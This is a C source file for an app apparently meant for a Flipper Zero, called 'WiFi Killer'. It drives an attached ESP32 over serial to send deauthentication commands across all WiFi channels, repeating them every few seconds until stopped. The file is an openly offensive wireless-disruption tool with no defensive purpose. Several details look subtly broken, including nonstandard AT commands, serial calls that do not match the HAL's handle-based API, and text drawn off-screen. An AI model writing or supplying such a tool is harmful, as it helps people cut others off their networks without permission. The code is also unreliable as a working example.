#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <furi_hal_serial.h>

static bool running = true;

// UART config for ESP32
#define UART_CHANNEL FuriHalSerialIdUsart1
#define ESP32_TX_PIN 13
#define ESP32_RX_PIN 14

static void input_callback(InputEvent* input, void* ctx) {
    UNUSED(ctx);
    if(input->type == InputTypePress && input->key == InputKeyBack) {
        running = false;
    }
}

// Send AT commands to ESP32
static void send_deauth_command() {
    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+DEAUTH=ALL,100,0\r\n", 22);
    furi_delay_ms(50);
    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+CHANNEL=ALL\r\n", 17);
    furi_delay_ms(50);
    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+BROADCAST=1\r\n", 17);
}

// Screen drawing
static void draw_callback(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 20, "WiFi Killer 100m");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 40, "Jamming ALL channels");
    canvas_draw_str(canvas, 5, 55, "Press BACK to stop");
    canvas_draw_str(canvas, 5, 70, "ESP32: Active");
}

int32_t wifi_killer_app(void* p) {
    UNUSED(p);
    
    // GUI setup
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, draw_callback, NULL);
    view_port_input_callback_set(view_port, input_callback, NULL);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
    
    // Init UART
    furi_hal_serial_init(UART_CHANNEL, 115200);
    furi_delay_ms(500);
    
    // Start jamming
    send_deauth_command();
    
    // Main loop
    uint32_t counter = 0;
    while(running) {
        furi_delay_ms(100);
        counter++;
        if(counter > 30) { // resend every ~3 seconds
            counter = 0;
            send_deauth_command();
        }
    }
    
    // Stop
    furi_hal_serial_tx(UART_CHANNEL, (uint8_t*)"AT+STOP\r\n", 9);
    furi_delay_ms(100);
    furi_hal_serial_deinit(UART_CHANNEL);
    
    // Cleanup
    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    
    return 0;
}
